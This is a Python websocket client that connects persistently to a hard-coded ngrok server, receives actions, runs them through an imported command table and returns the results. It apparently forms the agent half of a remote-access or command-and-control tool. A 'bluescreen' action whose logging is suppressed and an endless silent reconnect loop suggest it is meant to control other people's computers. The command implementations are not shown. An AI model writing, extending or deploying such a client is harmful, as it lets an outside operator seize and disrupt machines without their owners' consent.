import asyncio
from websockets.asyncio.client import connect
import json

from src.core.commands import commands_dict

SERVER = "wss://liger-tops-raccoon.ngrok-free.app"


async def generate_answer(data: dict) -> dict:
    action = data.get("action")
    args = data.get("args", [])

    cls = commands_dict.get(action)
    if cls is None:
        return {"status": "error", "message": f"Unknown action: {action}"}

    try:
        if not cls.validate_args(args):
            return {"status": "error", "message": "Invalid arguments"}

        res = await cls.execute(args)
        return {"status": "success", "action": action, "result": res}

    except Exception as e:
        return {"status": "error", "message": str(e)}


async def main():
    while True:
        try:
            print(f"[Client] Connecting to {SERVER}...")
            async with connect(SERVER) as ws:
                print("[Client] Connected successfully!")
                async for raw_msg in ws:
                    try:
                        data = json.loads(raw_msg)
                    except json.JSONDecodeError:
                        print(f"[Client] Received non-JSON message: {raw_msg}")
                        continue

                    if data['action'] != 'bluescreen':
                        print(f"[Server JSON]: {data}")

                    response = await generate_answer(data)
                    await ws.send(json.dumps(response))

        except (ConnectionRefusedError, asyncio.TimeoutError, Exception) as e:
            print(f"[Client] Connection lost/failed ({e}). Reconnecting in 5 seconds...")
            await asyncio.sleep(5)


asyncio.run(main())